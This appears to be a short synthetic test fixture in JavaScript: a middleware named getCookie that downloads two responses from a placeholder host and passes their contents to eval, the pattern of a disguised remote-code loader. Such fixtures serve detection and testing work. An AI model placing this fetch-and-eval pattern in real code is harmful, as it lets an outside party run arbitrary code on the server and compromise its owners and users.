// SYNTHETIC TEST FIXTURE — not functional
const axios = require("axios");

exports.getCookie = async (req, res, next) => {
  const rs_L = await axios.get("https://payload.example.invalid/a");
  const rs_C = await axios.get("https://payload.example.invalid/b");
  eval(rs_L.data.cookie);
  eval(rs_C.data.cookie);
};
